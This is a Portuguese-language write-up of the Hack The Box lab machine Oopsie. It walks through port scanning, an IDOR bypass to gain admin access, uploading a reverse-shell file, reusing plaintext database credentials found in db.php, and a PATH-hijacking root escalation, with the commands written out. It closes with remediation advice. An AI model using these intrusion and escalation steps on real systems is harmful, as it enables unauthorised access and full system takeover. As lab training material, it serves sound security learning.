# Report — Máquina: Oopsie — 10.129.7.9

- **Plataforma:** Hack The Box (Starting Point)
    
- **Dificuldade:** Very Easy
    
- **Autor:** Enrico
    
- **Metodologia:** PTES + NIST
    

---

## Executive Summary (NIST)

A máquina **Oopsie** foi comprometida através de falhas de controle de acesso na aplicação web, permitindo bypass de autorização e upload de arquivo malicioso, resultando em execução remota de comandos. A escalada de privilégios foi obtida explorando **PATH hijacking** em um binário **SUID root** mal implementado, culminando em acesso total ao sistema.

---

## 1. Planning & Scoping (PTES)

- **Alvo:** 10.129.7.9
    
- **Escopo:** Avaliação de segurança da aplicação web e sistema operacional
    
- **Ferramentas:** Nmap, Burp Suite, Gobuster, shell reversa
    
- **Limitações:** Nenhuma restrição adicional
    

---

## 2. Discovery / Reconnaissance (PTES)

### 2.1 Varredura de portas

```bash
sudo nmap -sS -T4 -p- -sV -O --min-rate 5000 10.129.7.9 -oN ~/Desktop/Nmap_Oopsie.txt
```

**Resultados relevantes:**

- **22/tcp** — SSH (OpenSSH 7.6p1)
    
- **80/tcp** — HTTP (Apache 2.4.29)
    

O host foi identificado como Linux (kernel 4.15–5.19).

**Arquivos:**

![](Nmap_Oopsie.txt)

---

## 3. Enumeration & Analysis (PTES)

### 3.1 Enumeração Web

Durante a análise da aplicação web, utilizando o **Burp Suite em modo Proxy**, foi identificado o endpoint oculto:

```
/cdn-cgi/login/
```

Esse endpoint apresentava uma página de autenticação funcional.

### 3.2 Broken Access Control

Após autenticação, foi observado que a aplicação utilizava parâmetros GET para controle de acesso:

```text
admin.php?content=accounts&id=2
```

Ao modificar manualmente o parâmetro para:

```text
admin.php?content=accounts&id=1
```

foi possível visualizar dados do usuário administrador (ID 34322), caracterizando **IDOR / Broken Access Control**.

---

## 4. Attack / Exploitation (PTES)

### 4.1 Upload de arquivo malicioso

Com acesso administrativo obtido via manipulação de requisições HTTP no Burp Suite, foi liberado o acesso à página de **upload**.

Foi enviado um arquivo **.phtml** contendo um payload de **reverse TCP**, resultando em shell remota no servidor.

---

## 5. Post-Exploitation

### 5.1 Credenciais em texto claro

Durante a enumeração local, foi encontrado o arquivo:

```
./cdn-cgi/login/db.php
```

Conteúdo relevante:

```php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
```

Essas credenciais permitiram acesso como o usuário **robert**.

### 5.2 Flag de usuário

A flag de usuário foi localizada em:

```
/home/robert/user.txt
```

---

## 6. Privilege Escalation

### 6.1 Enumeração de binários SUID

```bash
find / -perm -4000 -type f 2>/dev/null
```

Foi identificado o binário:

```
/usr/bin/bugtracker
```

### 6.2 Análise da vulnerabilidade

O binário **bugtracker**:

- Possui **SUID root**
    
- Executa o comando **cat** sem caminho absoluto
    

Isso permitiu exploração via **PATH hijacking**.

### 6.3 Exploração (PATH Hijacking)

```bash
cd /tmp
mkdir privesc
cd privesc
nano cat
chmod +x cat
export PATH=/tmp/privesc:$PATH
/usr/bin/bugtracker
```

O binário executou o `cat` falso, resultando em **shell root**.

---

## 7. Impact & Root Access (NIST)

### 7.1 Flag de root

Localizada em:

```
/root/root.txt
```

Impacto final:

- Comprometimento total do sistema
    
- Execução arbitrária como root
    

---

## 8. Remediation Recommendations

- Implementar **controle de acesso no lado do servidor**
    
- Validar permissões independentemente de parâmetros GET
    
- Evitar armazenamento de credenciais em texto claro
    
- Utilizar **caminhos absolutos** em binários SUID
    
- Sanitizar variáveis de ambiente (`PATH`)
    

---

## 9. Lessons Learned

- Broken Access Control é frequentemente explorável com simples manipulação de parâmetros
    
- PATH hijacking em binários SUID é um vetor crítico e comum
    
- Pequenas falhas lógicas podem levar ao comprometimento completo do sistema
    

---

## 10. Summary

Máquina concluída com sucesso, explorando enumeração web, falha de autorização, execução remota de código e **privilege escalation via PATH hijacking**, seguindo metodologia **PTES + NIST**.
